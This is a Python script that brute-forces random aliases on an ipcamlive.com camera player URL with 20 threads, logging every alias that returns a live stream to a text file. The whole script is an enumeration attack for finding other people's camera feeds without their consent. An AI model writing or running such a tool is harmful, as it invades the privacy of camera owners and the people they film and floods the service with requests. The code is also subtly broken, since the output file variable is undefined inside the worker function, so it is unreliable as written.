import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import sys

def generate_random_des_hash(length=13):
    """Generates a random string of specified length."""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def check_video_playable(url):
    """Checks if the page does not contain 'Camera not found'."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            if "Camera not found" not in response.text:
                return True
    except Exception as e:
        print(f"An error occurred: {e}")
    return False

def process_hash(base_url, checked_hashes, output_file_lock, search_counter):
    while True:
        des_hash = generate_random_des_hash()
        
        # Ensure the generated hash is unique
        with checked_hashes_lock:
            if des_hash in checked_hashes:
                continue
            checked_hashes.add(des_hash)

        full_url = base_url + des_hash

        if check_video_playable(full_url):
            print(f"Playable video found: {full_url}")
            with output_file_lock:
                with open(output_file, 'a') as f:
                    f.write(full_url + '\n')
                    f.flush()  # Ensure the URL is written to the file immediately

        with search_counter_lock:
            search_counter[0] += 1

def display_search_rate(search_counter):
    while True:
        time.sleep(1)
        with search_counter_lock:
            searches_last_second = search_counter[0]
            search_counter[0] = 0
        sys.stdout.write(f"\rSearches per second: {searches_last_second}")
        sys.stdout.flush()

def main():
    base_url = 'https://g1.ipcamlive.com/player/player.php?alias='
    output_file = 'playable_urls.txt'
    
    # Shared resources
    global checked_hashes
    checked_hashes = set()
    
    # Locks for thread safety
    global checked_hashes_lock
    checked_hashes_lock = threading.Lock()
    output_file_lock = threading.Lock()

    # Counter for searches
    global search_counter
    search_counter = [0]
    global search_counter_lock
    search_counter_lock = threading.Lock()

    # Start a thread to display the search rate
    display_thread = threading.Thread(target=display_search_rate, args=(search_counter,))
    display_thread.daemon = True
    display_thread.start()

    # Create a thread pool and submit tasks
    num_threads = 20
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(process_hash, base_url, checked_hashes, output_file_lock, search_counter) for _ in range(num_threads)]
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                print(f"Thread generated an exception: {exc}")

if __name__ == "__main__":
    main()
